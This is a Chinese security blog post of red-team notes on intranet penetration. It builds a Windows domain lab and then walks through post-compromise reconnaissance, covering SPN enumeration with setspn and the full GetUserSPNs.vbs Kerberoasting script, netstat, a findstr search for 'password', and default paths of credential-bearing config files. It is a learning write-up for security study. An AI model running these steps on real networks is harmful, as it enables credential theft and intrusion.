<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>红蓝功防相关笔记总结 | ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="声明  郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！  前言  本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加  PS  目前就差委派没有写了 搭建域环境 环境清单  由于我们需要域环境模拟常规的内">
<meta property="og:type" content="article">
<meta property="og:title" content="红蓝功防相关笔记总结">
<meta property="og:url" content="https://www.ascotbe.com/2020/08/03/IntranetPenetration/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:description" content="声明  郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！  前言  本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加  PS  目前就差委派没有写了 搭建域环境 环境清单  由于我们需要域环境模拟常规的内">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/112.jpg">
<meta property="article:published_time" content="2020-08-03T13:45:42.000Z">
<meta property="article:modified_time" content="2020-09-13T01:22:37.739Z">
<meta property="article:author" content="ascotbe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/112.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/2020/08/03/IntranetPenetration/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-09-13 09:22:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">98</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gitee.com/asc0t6e/Random-img/raw/master/Blog/112.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红蓝功防相关笔记总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-03T13:45:42.000Z" title="发表于 2020-08-03 21:45:42">2020-08-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-09-13T01:22:37.739Z" title="更新于 2020-09-13 09:22:37">2020-09-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>声明</p>
</blockquote>
<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
<blockquote>
<p>前言</p>
</blockquote>
<p>本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加</p>
<blockquote>
<p>PS</p>
</blockquote>
<p>目前就差委派没有写了</p>
<h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><blockquote>
<p>环境清单</p>
</blockquote>
<p>由于我们需要域环境模拟常规的内网，所以搭建域环境</p>
<ul>
<li>Windows 2008 R2 X64</li>
<li>Windows 10</li>
<li>Windows 7 SP1 X64</li>
</ul>
<p>Windows需要执行<code>set-executionpolicy remotesigned</code>来打开默认不允许执行ps脚本</p>
<h3 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h3><p>位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4</p>
<p>然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/1.png?raw=true" alt="image-20200729222159021"></p>
<h3 id="配置域环境"><a href="#配置域环境" class="headerlink" title="配置域环境"></a>配置域环境</h3><p>在服务管理器中添加角色</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/2.png?raw=true" alt="image-20200729222459835"></p>
<p>然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/3.png?raw=true" alt="image-20200729222546079"></p>
<p>然后就是无脑下一步安装，就可以安装成功了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/4.png?raw=true" alt="image-20200729222646209"></p>
<p>接着我们点开角色位置</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/5.png?raw=true" alt="image-20200729222814376"></p>
<p>会看到这个提示，我们只要点击蓝色的位置也就是<strong>dcpromo.exe</strong>就会出来这个页面</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/6.png?raw=true" alt="image-20200729222917906"></p>
<p>点击下一步</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/7.png?raw=true" alt="image-20200729223024238"></p>
<p>这边看了一下倾旋师傅写的<strong>Windows NT 4.0兼容的加密算法</strong>相关说明，这个算法是低版本的SMBv1客户端，在进行NTLM网络认证的过程中采用的算法较为简单，能够轻易破解，并且可能会受到Pass The Hash的技术手段利用、MS17-010等漏洞的危害，现在都是SMBv3的版本了</p>
<p>我们下一步</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/8.png?raw=true" alt="image-20200729223717033"></p>
<p>这边选择<strong>新林</strong>，林表示多个域的集合，因为我们只有一个域所以这边用新的林。如果你设置了密码还是报错说你账户密码不符合要求的话就在命令行里面输入即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator &#x2F;passwordreq:yes</span><br></pre></td></tr></table></figure>

<p>然后这边会要我们输入一个域名，我这边就填我博客的域名了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/9.png?raw=true" alt="image-20200729225803364"></p>
<p>接着下一步可以看到，选择级别，我们直接选默认的2003</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/10.png?raw=true" alt="image-20200729225859743"></p>
<p>一直下一步会弹出这个</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/11.png?raw=true" alt="image-20200729230152688"></p>
<p>点击是</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/12.png?raw=true" alt="image-20200729230236422"></p>
<p>然后设置DC管理员密码</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/13.png?raw=true" alt="image-20200729230312638"></p>
<p>下一步后就能看到设置内容了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/14.png?raw=true" alt="image-20200729230418827"></p>
<p>然后点击完成后重启，这边等就好了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/15.png?raw=true" alt="image-20200729230456239"></p>
<p>重启后可以看到配置成功了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/16.png?raw=true" alt="image-20200729231055590"></p>
<h3 id="加入于环境"><a href="#加入于环境" class="headerlink" title="加入于环境"></a>加入于环境</h3><p>接着我们打开准备好的Windows 10来ping下域IP是否能通</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/17.png?raw=true" alt="image-20200729231256289"></p>
<p>然然后将当前主机的DNS服务器设置为DC的IP</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/18.png?raw=true" alt="image-20200729231448959"></p>
<p>然后ping下我们的域</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/19.png?raw=true" alt="image-20200729231549287"></p>
<p>接着找到系统属性</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/20.png?raw=true" alt="image-20200729231932391"></p>
<p>点击网络</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/21.png?raw=true" alt="image-20200729231951186"></p>
<p>点击下一步</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/22.png?raw=true" alt="image-20200729232030994"></p>
<p>点击下一步，然后到这个页面，我们填上用户名，然后先不要点击下一步</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/23.png?raw=true" alt="image-20200729234534909"></p>
<p>我们切换到windows 2008那台域控里面，新建一个用户</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/24.png?raw=true" alt="image-20200729232339467"></p>
<p>然后填写用户名</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/25.png?raw=true" alt="image-20200729234417477"></p>
<p>下一步后填写密码</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/26.png?raw=true" alt="image-20200729232533961"></p>
<p>然后我们回到Windows 10，填上我们设置好的密码，和域名</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/27.png?raw=true" alt="image-20200729234508295"></p>
<p>这边可能会报错说域不同，具体按上面写的信息来填就能到这一步</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/28.png?raw=true" alt="image-20200729234734276"></p>
<p>然后点击下一步，选着<strong>Users</strong>权限</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/29.png?raw=true" alt="image-20200729234817121"></p>
<p>下一步后重启完就行了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/30.png?raw=true" alt="image-20200729234940152"></p>
<p>可以看到我们在域环境下并且能上网了</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/31.png?raw=true" alt="image-20200729235153363"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。</p>
<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>这个也是我第一次接触，谷歌了一下，这边直接饮用官方介绍。SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符，它由服务类、主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。</p>
<blockquote>
<p>特点</p>
</blockquote>
<p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以快速发现内网中的资产以及服务</p>
<ol>
<li><p><strong>利用Windows自带的setspn工具，普通域用户权限执行即可</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/32.png?raw=true" alt="image-20200730212937561"></p>
<p>由截图可以看到<strong>WIN-1OUEMJB0766</strong>（DC服务器）上面运行DNS服务，该命令可以把内网的相关服务都扫描出来包括mysql之类的</p>
</li>
<li><p><strong>利用GetUserSPNs.vbs获取SPN结果</strong></p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nidem&#x2F;kerberoast</span><br></pre></td></tr></table></figure>

<p>其中的源码</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Edits by Tim Medin</span></span><br><span class="line"><span class="comment">&#x27; File:     GetUserSPNS.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents: Query the domain to find SPNs that use User accounts</span></span><br><span class="line"><span class="comment">&#x27; Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast</span></span><br><span class="line"><span class="comment">&#x27;           The password hash used with Computer accounts are infeasible to </span></span><br><span class="line"><span class="comment">&#x27;           crack; however, if the User account associated with an SPN may have</span></span><br><span class="line"><span class="comment">&#x27;           a crackable password. This tool will find those accounts. You do not</span></span><br><span class="line"><span class="comment">&#x27;           need any special local or domain permissions to run this script. </span></span><br><span class="line"><span class="comment">&#x27;           This script on a script supplied by Microsoft (details below).</span></span><br><span class="line"><span class="comment">&#x27; History:    2014/11/12     Tim Medin    Created</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Original Script Details:</span></span><br><span class="line"><span class="comment">&#x27; Copyright (c) Microsoft Corporation 2004 -</span></span><br><span class="line"><span class="comment">&#x27; File:                querySpn.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents:     Query a given SPN in a given forest to find the owners</span></span><br><span class="line"><span class="comment">&#x27; History:         7/7/2004     Craig Wiand     Created        </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Option</span> <span class="keyword">Explicit</span>         </span><br><span class="line"><span class="keyword">Dim</span> oConnection, oCmd, oRecordSet</span><br><span class="line"><span class="keyword">Dim</span> oGC, oNSP</span><br><span class="line"><span class="keyword">Dim</span> strGCPath, strClass, strADOQuery</span><br><span class="line"><span class="keyword">Dim</span> vObjClass, vSPNs, vName</span><br><span class="line"></span><br><span class="line">ParseCommandLine()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Set up the connection ---</span></span><br><span class="line"><span class="keyword">Set</span> oConnection = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Connection&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> oCmd = <span class="built_in">CReateObject</span>(<span class="string">&quot;ADODB.Command&quot;</span>)</span><br><span class="line">oConnection.Provider = <span class="string">&quot;ADsDSOObject&quot;</span></span><br><span class="line">oConnection.Open <span class="string">&quot;ADs Provider&quot;</span></span><br><span class="line"><span class="keyword">Set</span> oCmd.ActiveConnection = oConnection</span><br><span class="line">oCmd.Properties(<span class="string">&quot;Page Size&quot;</span>) = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Build the query string ---</span></span><br><span class="line">strADOQuery = <span class="string">&quot;&lt;&quot;</span> + strGCPath + <span class="string">&quot;&gt;;(&amp;(!objectClass=computer)(servicePrincipalName=*));&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;dnsHostName,distinguishedName,servicePrincipalName,objectClass,&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;samAccountName;subtree&quot;</span></span><br><span class="line">oCmd.CommandText = strADOQuery</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Execute the query for the object in the directory ---</span></span><br><span class="line"><span class="keyword">Set</span> oRecordSet = oCmd.<span class="keyword">Execute</span></span><br><span class="line"><span class="keyword">If</span> oRecordSet.EOF <span class="keyword">and</span> oRecordSet.Bof <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;No SPNs found!&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">Not</span> oRecordset.Eof</span><br><span class="line">Wscript.Echo oRecordset.Fields(<span class="string">&quot;distinguishedName&quot;</span>)</span><br><span class="line"><span class="comment">&#x27;vObjClass = oRecordset.Fields(&quot;objectClass&quot;)</span></span><br><span class="line"><span class="comment">&#x27;strClass = vObjClass( UBound(vObjClass) )</span></span><br><span class="line"><span class="comment">&#x27;Wscript.Echo &quot;Class: &quot; &amp; strClass</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">UCase</span>(strClass) = <span class="string">&quot;COMPUTER&quot;</span> <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;Computer DNS: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;dnsHostName&quot;</span>)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;User Logon: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;samAccountName&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Display the SPNs on the object --- </span></span><br><span class="line">vSPNs = oRecordset.Fields(<span class="string">&quot;servicePrincipalName&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> vName <span class="keyword">in</span> vSPNs</span><br><span class="line">Wscript.Echo <span class="string">&quot;-- &quot;</span> + vName</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">oRecordset.MoveNext</span><br><span class="line"><span class="keyword">Wend</span></span><br><span class="line"></span><br><span class="line">oRecordset.Close</span><br><span class="line">oConnection.Close</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ShowUsage()</span><br><span class="line">Wscript.Echo <span class="string">&quot; USAGE:        &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; SpnToFind [GC Servername or Forestname]&quot;</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; Corp.com&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ParseCommandLine()</span><br><span class="line"><span class="keyword">If</span> WScript.Arguments.Count = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">If</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-h&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;--help&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-?&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;/?&quot;</span> <span class="keyword">Then</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">strGCPath = <span class="string">&quot;GC://&quot;</span> &amp; WScript.Arguments(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">ElseIf</span> WScript.Arguments.Count = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line"><span class="comment">&#x27; Set the GC</span></span><br><span class="line"><span class="keyword">Set</span> oNSP = <span class="built_in">GetObject</span>(<span class="string">&quot;GC:&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> oGC <span class="keyword">in</span> oNSP</span><br><span class="line">strGCPath = oGC.ADsPath</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/33.png?raw=true" alt="image-20200730214227054"></p>
</li>
</ol>
<h3 id="端口连接"><a href="#端口连接" class="headerlink" title="端口连接"></a>端口连接</h3><p>利用<code>netstat -ano</code>命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/34.png?raw=true" alt="image-20200730215441721"></p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr  /s /m <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure>

<p>这条命令是查找当前文件夹下的文件，不是全局搜索</p>
<p>接下来是各个中间件的默认配置文件路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Tomcat</span><br><span class="line">&#x2F;CATALINA_HOME&#x2F;conf&#x2F;tomcat-users.xml</span><br><span class="line">#Apache</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">#Nginx</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">#Wdcp</span><br><span class="line">&#x2F;www&#x2F;wdlinux&#x2F;wdcp&#x2F;conf&#x2F;mrpw.conf</span><br><span class="line">#Mysql</span><br><span class="line">&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD</span><br></pre></td></tr></table></figure>

